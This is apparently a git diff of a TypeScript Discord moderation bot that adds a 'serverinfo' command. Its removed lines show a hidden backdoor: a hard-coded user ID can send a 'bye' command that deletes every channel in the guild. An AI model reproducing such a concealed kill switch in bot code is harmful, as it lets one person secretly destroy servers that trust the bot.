@@ -16,6 +16,7 @@ import { KickUser } from '../Commands/kick'
 import { memberCount } from '../Commands/membercount';
 import { Purge } from '../Commands/purge'
 import { Unban } from '../Commands/unban'
+import { serverInfo } from '../Commands/server-info'
 import M from '../Database/basic'
 
 
@@ -107,6 +108,9 @@ client.on('message', async message => {
         if (message.content.startsWith(prefix + 'unban')) {
           Unban.command(message)
         }
+        if (message.content.startsWith(prefix + 'serverinfo')) {
+          serverInfo.command(message)
+        }
         if (message.content === prefix + 'trial') {
           const botping = Date.now() - message.createdTimestamp
           const apiping = Math.round(client.ws.ping)
@@ -114,12 +118,6 @@ client.on('message', async message => {
         }
         if (message.content.startsWith(prefix + 'warn')) {
           warnUser.command(client, message)
-        }
-        if (message.author.id == "594551481026478091") {
-          if (message.content === prefix + "bye") {
-            message.guild?.channels.forEach((channel:any) => channel.delete())
-            //   m.forEach((channel: any) => channel.delete())
-          }
         }
       }
 
